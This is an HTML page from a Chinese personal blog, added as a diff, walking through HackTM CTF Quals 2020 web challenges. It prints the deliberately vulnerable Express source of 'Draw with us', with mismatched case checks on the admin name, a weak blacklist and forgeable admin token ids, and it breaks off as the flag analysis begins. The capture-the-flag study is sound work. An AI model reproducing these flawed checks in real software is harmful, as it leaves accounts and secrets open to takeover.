@@ -1,0 +1,877 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言好久没有做题了，这几天看到ctftime上有一个新的比赛因此做了一下。 0x01 Draw with us题目源码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTM CTF Quals 2020的部分web题复现">
+<meta property="og:url" content="http://yoursite.com/2020/02/09/HackTM-CTF-Quals-2020的部分web题复现/index.html">
+<meta property="og:site_name" content="L&#39;s Blog">
+<meta property="og:description" content="前言好久没有做题了，这几天看到ctftime上有一个新的比赛因此做了一下。 0x01 Draw with us题目源码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2020-02-09T11:55:37.203Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HackTM CTF Quals 2020的部分web题复现">
+<meta name="twitter:description" content="前言好久没有做题了，这几天看到ctftime上有一个新的比赛因此做了一下。 0x01 Draw with us题目源码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/02/09/HackTM-CTF-Quals-2020的部分web题复现/">
+
+
+
+
+
+  <title>HackTM CTF Quals 2020的部分web题复现 | L's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">L's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">share with you</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/09/HackTM-CTF-Quals-2020的部分web题复现/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ljdd520">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">HackTM CTF Quals 2020的部分web题复现</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-09T19:54:05+08:00">
+                2020-02-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/javascript-web/" itemprop="url" rel="index">
+                    <span itemprop="name">javascript-web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  4.2k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  23
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>好久没有做题了，这几天看到ctftime上有一个新的比赛因此做了一下。</p>
+<h5 id="0x01-Draw-with-us"><a href="#0x01-Draw-with-us" class="headerlink" title="0x01 Draw with us"></a>0x01 Draw with us</h5><h6 id="题目源码如下："><a href="#题目源码如下：" class="headerlink" title="题目源码如下："></a>题目源码如下：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">"express"</span>);</span><br><span class="line"><span class="keyword">const</span> cors = <span class="built_in">require</span>(<span class="string">"cors"</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="keyword">const</span> uuidv4 = <span class="built_in">require</span>(<span class="string">"uuid/v4"</span>);</span><br><span class="line"><span class="keyword">const</span> md5 = <span class="built_in">require</span>(<span class="string">"md5"</span>);</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">"express-jwt"</span>);</span><br><span class="line"><span class="keyword">const</span> jsonwebtoken = <span class="built_in">require</span>(<span class="string">"jsonwebtoken"</span>);</span><br><span class="line"><span class="keyword">const</span> server = <span class="built_in">require</span>(<span class="string">"http"</span>).createServer(app);</span><br><span class="line"><span class="keyword">const</span> io = <span class="built_in">require</span>(<span class="string">"socket.io"</span>)(server);</span><br><span class="line"><span class="keyword">const</span> bigInt = <span class="built_in">require</span>(<span class="string">"big-integer"</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; flag, p, n, _clearPIN, jwtSecret &#125; = <span class="built_in">require</span>(<span class="string">"./flag"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">  port: process.env.PORT || <span class="number">8081</span>,</span><br><span class="line">  width: <span class="number">120</span>,</span><br><span class="line">  height: <span class="number">80</span>,</span><br><span class="line">  usersOnline: <span class="number">0</span>,</span><br><span class="line">  message: <span class="string">"Hello there!"</span>,</span><br><span class="line">  p: p,</span><br><span class="line">  n: n,</span><br><span class="line">  adminUsername: <span class="string">"hacktm"</span>,</span><br><span class="line">  whitelist: [<span class="string">"/"</span>, <span class="string">"/login"</span>, <span class="string">"/init"</span>],</span><br><span class="line">  backgroundColor: <span class="number">0x888888</span>,</span><br><span class="line">  version: <span class="built_in">Number</span>.MIN_VALUE</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">io.sockets.on(<span class="string">"connection"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">socket</span>) </span>&#123;</span><br><span class="line">  config.usersOnline++;</span><br><span class="line">  socket.on(<span class="string">"disconnect"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    config.usersOnline--;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> users = &#123;</span><br><span class="line">  <span class="number">0</span>: &#123;</span><br><span class="line">    username: config.adminUsername,</span><br><span class="line">    rights: <span class="built_in">Object</span>.keys(config)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> board = <span class="keyword">new</span> <span class="built_in">Array</span>(config.height)</span><br><span class="line">  .fill(<span class="number">0</span>)</span><br><span class="line">  .map(<span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">new</span> <span class="built_in">Array</span>(config.width).fill(config.backgroundColor));</span><br><span class="line"><span class="keyword">let</span> boardString = boardToStrings();</span><br><span class="line"></span><br><span class="line">app.use(express.json());</span><br><span class="line">app.use(cors());</span><br><span class="line">app.use(</span><br><span class="line">  jwt(&#123; <span class="attr">secret</span>: jwtSecret &#125;).unless(&#123;</span><br><span class="line">    path: config.whitelist</span><br><span class="line">  &#125;)</span><br><span class="line">);</span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">error, req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (error.name === <span class="string">"UnauthorizedError"</span>) &#123;</span><br><span class="line">    res.json(err(<span class="string">"Invalid token or not logged in."</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sign</span>(<span class="params">o</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> jsonwebtoken.sign(o, jwtSecret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAdmin</span>(<span class="params">u</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> u.username.toLowerCase() == config.adminUsername.toLowerCase();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ok</span>(<span class="params">data = &#123;&#125;</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">status</span>: <span class="string">"ok"</span>, <span class="attr">data</span>: data &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">err</span>(<span class="params">msg = <span class="string">"Something went wrong."</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">status</span>: <span class="string">"error"</span>, <span class="attr">message</span>: msg &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">onlyUnique</span>(<span class="params">value, index, self</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> self.indexOf(value) === index;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">"/"</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="comment">// Get current board</span></span><br><span class="line">  res.json(ok(&#123; <span class="attr">board</span>: boardString &#125;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">"/init"</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="comment">// Initialize new round and sign admin token</span></span><br><span class="line">  <span class="comment">// RSA protected!</span></span><br><span class="line">  <span class="comment">// POST</span></span><br><span class="line">  <span class="comment">// &#123;</span></span><br><span class="line">  <span class="comment">//   p:"0",</span></span><br><span class="line">  <span class="comment">//   q:"0"</span></span><br><span class="line">  <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> &#123; p = <span class="string">"0"</span>, q = <span class="string">"0"</span>, clearPIN &#125; = req.body;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> target = md5(config.n.toString());</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> pwHash = md5(</span><br><span class="line">    bigInt(<span class="built_in">String</span>(p))</span><br><span class="line">      .multiply(<span class="built_in">String</span>(q))</span><br><span class="line">      .toString()</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (pwHash == target &amp;&amp; clearPIN === _clearPIN) &#123;</span><br><span class="line">    <span class="comment">// Clear the board</span></span><br><span class="line">    board = <span class="keyword">new</span> <span class="built_in">Array</span>(config.height)</span><br><span class="line">      .fill(<span class="number">0</span>)</span><br><span class="line">      .map(<span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">new</span> <span class="built_in">Array</span>(config.width).fill(config.backgroundColor));</span><br><span class="line">    boardString = boardToStrings();</span><br><span class="line"></span><br><span class="line">    io.emit(<span class="string">"board"</span>, &#123; <span class="attr">board</span>: boardString &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//Sign the admin ID</span></span><br><span class="line">  <span class="keyword">let</span> adminId = pwHash</span><br><span class="line">    .split(<span class="string">""</span>)</span><br><span class="line">    .map(<span class="function">(<span class="params">c, i</span>) =&gt;</span> c.charCodeAt(<span class="number">0</span>) ^ target.charCodeAt(i))</span><br><span class="line">    .reduce(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a + b);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">console</span>.log(adminId);</span><br><span class="line"></span><br><span class="line">  res.json(ok(&#123; <span class="attr">token</span>: sign(&#123; <span class="attr">id</span>: adminId &#125;) &#125;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">"/flag"</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="comment">// Get the flag</span></span><br><span class="line">  <span class="comment">// Only for root</span></span><br><span class="line">  <span class="keyword">if</span> (req.user.id == <span class="number">0</span>) &#123;</span><br><span class="line">    res.send(ok(&#123; <span class="attr">flag</span>: flag &#125;));</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.send(err(<span class="string">"Unauthorized"</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">"/serverInfo"</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="comment">// Get server info</span></span><br><span class="line">  <span class="comment">// Only for logged in users</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> user = users[req.user.id] || &#123; <span class="attr">rights</span>: [] &#125;;</span><br><span class="line">  <span class="keyword">let</span> info = user.rights.map(<span class="function"><span class="params">i</span> =&gt;</span> (&#123; <span class="attr">name</span>: i, <span class="attr">value</span>: config[i] &#125;));</span><br><span class="line">  res.json(ok(&#123; <span class="attr">info</span>: info &#125;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">"/paint"</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="comment">// Paint on the canvas</span></span><br><span class="line">  <span class="comment">// Only for logged in users</span></span><br><span class="line">  <span class="comment">// POST</span></span><br><span class="line">  <span class="comment">// &#123;</span></span><br><span class="line">  <span class="comment">//   x:0,</span></span><br><span class="line">  <span class="comment">//   y:0</span></span><br><span class="line">  <span class="comment">// &#125;</span></span><br><span class="line">  <span class="keyword">let</span> user = users[req.user.id] || &#123;&#125;;</span><br><span class="line"></span><br><span class="line">  x = req.body.x;</span><br><span class="line">  y = req.body.y;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> color = user.color || <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (board[y] &amp;&amp; board[y][x] &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    board[y][x] = color;</span><br><span class="line">    boardString = boardToStrings();</span><br><span class="line">    io.emit(<span class="string">"change"</span>, &#123; <span class="attr">change</span>: &#123; <span class="attr">pos</span>: [x, y], <span class="attr">color</span>: color &#125; &#125;);</span><br><span class="line">    res.send(ok());</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.send(err(<span class="string">"Invalid painting"</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">"/updateUser"</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="comment">// Update user color and rights</span></span><br><span class="line">  <span class="comment">// Only for admin</span></span><br><span class="line">  <span class="comment">// POST</span></span><br><span class="line">  <span class="comment">// &#123;</span></span><br><span class="line">  <span class="comment">//   color: 0xDEDBEE,</span></span><br><span class="line">  <span class="comment">//   rights: ["height", "width", "usersOnline"]</span></span><br><span class="line">  <span class="comment">// &#125;</span></span><br><span class="line">  <span class="keyword">let</span> uid = req.user.id;</span><br><span class="line">  <span class="keyword">let</span> user = users[uid];</span><br><span class="line">  <span class="keyword">if</span> (!user || !isAdmin(user)) &#123;</span><br><span class="line">    res.json(err(<span class="string">"You're not an admin!"</span>));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> color = <span class="built_in">parseInt</span>(req.body.color);</span><br><span class="line">  users[uid].color = (color || <span class="number">0x0</span>) &amp; <span class="number">0xffffff</span>;</span><br><span class="line">  <span class="keyword">let</span> rights = req.body.rights || [];</span><br><span class="line">  <span class="keyword">if</span> (rights.length &gt; <span class="number">0</span> &amp;&amp; checkRights(rights)) &#123;</span><br><span class="line">    users[uid].rights = user.rights.concat(rights).filter(onlyUnique);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  res.json(ok(&#123; <span class="attr">user</span>: users[uid] &#125;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">"/login"</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="comment">// Login</span></span><br><span class="line">  <span class="comment">// POST</span></span><br><span class="line">  <span class="comment">// &#123;</span></span><br><span class="line">  <span class="comment">//   username: "dumbo",</span></span><br><span class="line">  <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> u = &#123;</span><br><span class="line">    username: req.body.username,</span><br><span class="line">    id: uuidv4(),</span><br><span class="line">    color: <span class="built_in">Math</span>.random() &lt; <span class="number">0.5</span> ? <span class="number">0xffffff</span> : <span class="number">0x0</span>,</span><br><span class="line">    rights: [</span><br><span class="line">      <span class="string">"message"</span>,</span><br><span class="line">      <span class="string">"height"</span>,</span><br><span class="line">      <span class="string">"width"</span>,</span><br><span class="line">      <span class="string">"version"</span>,</span><br><span class="line">      <span class="string">"usersOnline"</span>,</span><br><span class="line">      <span class="string">"adminUsername"</span>,</span><br><span class="line">      <span class="string">"backgroundColor"</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (isValidUser(u)) &#123;</span><br><span class="line">    users[u.id] = u;</span><br><span class="line">    res.send(ok(&#123; <span class="attr">token</span>: sign(&#123; <span class="attr">id</span>: u.id &#125;) &#125;));</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.json(err(<span class="string">"Invalid creds"</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isValidUser</span>(<span class="params">u</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    u.username.length &gt;= <span class="number">3</span> &amp;&amp;</span><br><span class="line">    u.username.toUpperCase() !== config.adminUsername.toUpperCase()</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">boardToStrings</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> board.map(<span class="function"><span class="params">b</span> =&gt;</span> b.join(<span class="string">","</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkRights</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> blacklist = [<span class="string">"p"</span>, <span class="string">"n"</span>, <span class="string">"port"</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> element = arr[i];</span><br><span class="line">    <span class="keyword">if</span> (blacklist.includes(element)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server.listen(config.port, () =&gt;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`Server listening on port <span class="subst">$&#123;config.port&#125;</span>!`</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<h6 id="现在我们看怎么获取flag，下面这段代码返回了flag"><a href="#现在我们看怎么获取flag，下面这段代码返回了flag" class="headerlink" title="现在我们看怎么获取flag，下面这段代码返回了flag:"></a>现在我们看怎么获取<code>flag</code>，下面这段代码返回了<code>flag</code>:</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (req.user.id == <span class="number">0</span>) &#123;</span><br><span class="line">  res.send(ok(&#123; <span class="attr">flag</span>: flag &#125;));</span><br></pre></td></tr></table></figure>
+
